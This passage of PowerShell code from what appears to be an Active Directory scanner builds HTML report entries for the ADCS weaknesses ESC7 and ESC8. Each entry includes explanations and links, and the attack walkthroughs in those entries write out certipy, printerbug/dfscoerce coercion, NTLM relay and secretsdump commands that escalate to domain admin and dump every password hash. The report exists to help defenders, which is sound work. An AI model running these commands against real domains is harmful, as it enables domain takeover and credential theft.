                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">CA Name</td><td>$($finding.Name)</td></tr>
                                            <tr><td class="grey">IdentityReference</td><td>$($finding.IdentityReference)</td></tr>
                                            <tr><td class="grey">ActiveDirectoryRights</td><td>$($finding.ActiveDirectoryRights)</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>ESC7 is a vulnerability within ADCS where a low-privileged user has the ManageCA or Manage Certificate rights, which allow user to issue failed certificate requests such as exploit requests which have failed due to lacking permissions.</p>
                                            <p>$($finding.IdentityReference) has $($finding.ActiveDirectoryRights) rights over $($finding.Name), giving $($finding.IdentityReference) the ability to approve failed ESC1 requests, thus allowing the user to exploit ESC1. $($finding.IdentityReference) can request to enroll in the SubCA template (vulnerable to ESC1 by default). The request will be denied as only administraors can enroll in the template, however can simply issue the failed request using the manage permissions afterwards, facilitating successful ESC1.</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2>">Link 1</a></p>
                                            <p><a href="https://www.tarlogic.com/blog/ad-cs-esc7-attack/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A low-privileged user can remotely enumerate domain certificate authorities for low-privileged users with the ManageCA or Manage Certificate rights using certipy.</p>
                                                    <p class="code">python3 entry.py find -u test@test.local -p 'Password123!' -stdout -vulnerable</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/PKI/ESC7-1.png" alt="Finding ESC7">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. The SubCA template is by default vulnerable to ESC1, but only administrators can enroll in the template. If disabled, this template can first be enabled on the CA.</p>
                                                    <p class="code">certipy ca -ca 'test-CA-CA' -target ca.test.local -enable-template SubCA -u test@test.local -p 'Password123!'</p>

                                                    <p>A certificate based on the SubCA template can be requested with a SAN of Administrator like in ESC1. This request will be denied, but we will save the private key and note down the request ID.</p>
                                                    <p class="code">certipy req -u test@test.local -p 'Password123!' -ca test-CA-CA -target ca.test.local -template SubCA -upn administrator@test.local</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/PKI/ESC7-2.png" alt="Exploiting ESC7">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. The failed certificate request can be issued with the ca command and the -issue-request <request ID> parameter.</p>
                                                    <p class="code">certipy ca -ca 'test-CA-CA' -target ca.test.local -issue-request 77 -u test@test.local -p 'Password123!'</p>

                                                    <p>The issued certificate can then be retrieved with the req command.</p>
                                                    <p class="code">certipy req -u test@test.local -p 'Password123!' -ca test-CA-CA -target ca.test.local -retrieve 77</p>
                                                             
                                                    <p>The retrived certificate can then be used with PKINIT to authenticate as the domain administrator and obtain their NTLM hash, allowing full impersonation and domain privilege escalation.</p>
                                                    <p class="code">certipy auth -pfx administrator.pfx -dc-ip 192.168.10.141</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/PKI/ESC7-3.png" alt="Exploiting ESC7">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>$remediation</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@
            }
            elseif ($finding.Technique -eq "ESC8") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Low-privileged users can impersonate the identity of a domain controller via a 'NTLM relay' attack.</td>
                                        <td>TA0004, TA0008, T1003.006</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">CA Name</td><td>$($finding."CA Name")</td></tr>
                                            <tr><td class="grey">CA Endpoint</td><td>$($finding."CA Endpoint")</td></tr>
                                            <tr><td class="grey">Relay Protections</td><td>False</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>ESC8 is a vulnerability within ADCS where a certificate authority has the Web Enrollment service installed and is enabled via HTTP.
                                                The web enrollment interface ($($finding."CA Endpoint")) is vulnerable to 'NTLM relay' attacks. 
                                                    Without necessary protections, the web services endpoint can by-default be exploited to issue arbitrary certificates in the context of the coerced authentication (i.e. of a domain controller) to any low privileged user.</p>
                                            <p>This allows a low-privileged user to escalate to a domain controller and extract all user passwords from the domain.</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2>">Link 1</a></p>
                                            <p><a href="https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-3/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A low-privileged user can remotely enumerate domain certificate authorities HTTP web services endpoints and see if they are lacking relaying protections using certipy. 
                                                    </p>
                                                    <p class="code">python3 entry.py find -u test@test.local -p 'Password123!' -stdout -vulnerable</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/PKI/ESC8-1.png"
                                                        alt="Finding ESC8">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. A low-privileged user can by default coerce machine authentication using RPC from the domain controller to an attacker controlled machine
                                                        (192.168.10.130) with printerbug.py or dfscoerce.py.
                                                    </p>
                                                    <p class="code">python3 printerbug.py test:'Password123'@192.168.10.141
                                                        192.168.10.130</p>
                                                    <p class="code">python3 dfscoerce.py -u test -p 'Password123!' -d test.local
                                                        192.168.10.130 192.168.10.141</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/PKI/ESC8-2.png"
                                                        alt="Coercing authentication">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>3. The coerced authentication is then relayed to an unsecured certificate HTTP endpoint (e.g. http://192.168.10.142/certsrv/certfnsh.asp)
                                                         to enroll in the default "DomainController" certificate template under the context of the domain controller. This returns a pfx certificate as the domain controller.
                                                    </p>

                                                    <p class="code">python3 entry.py relay -target 'http://192.168.10.141' -template
                                                        DomainController</p>
                                                        <p>This authentication certificate can be used to obtain the ntlm hash for the domain controller.</p>
                                                    <p class="code">python3 entry.py auth -pfx 'dc.pfx' -dc-ip 192.168.10.141</p>
                                                    <p> The ntlm hash can then be used to replicate the behavior of a domain
                                                        controller and obtain all the user password hashes within the domain via a DCSync.</p>
                                                    <p class="code">impacket-secretsdump 'dc$'@192.168.10.141 -hashes :1ee19a386bc9a3f08522b038e4ae0add</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/PKI/ESC8-3.png"
                                                        alt="Relaying authentication to ADCS web endpoint">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>$remediation</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@  
            }
        }
        $html += "</tbody></table></div>"
    }
    return $html
}

